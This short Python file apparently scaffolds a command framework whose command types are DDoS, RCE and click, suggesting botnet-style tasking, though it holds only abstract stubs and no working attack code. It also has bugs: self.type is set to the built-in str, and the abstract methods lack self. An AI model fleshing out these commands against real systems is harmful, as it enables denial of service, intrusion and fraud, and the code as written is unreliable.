from abc import ABC, abstractmethod
import uuid
from enum import Enum

class CommandType:
    DDoS = 'ddos'
    RCE = 'rce'
    CLICK = 'click'

class Command(ABC):
    def __init__(self, type: str, atomic: bool = True) -> None:
        self.id = uuid.uuid4()
        self.type = str
        self.is_atomic = atomic

    @abstractmethod
    def process() -> None:
        pass

    @abstractmethod
    def stop() -> None:
        pass
    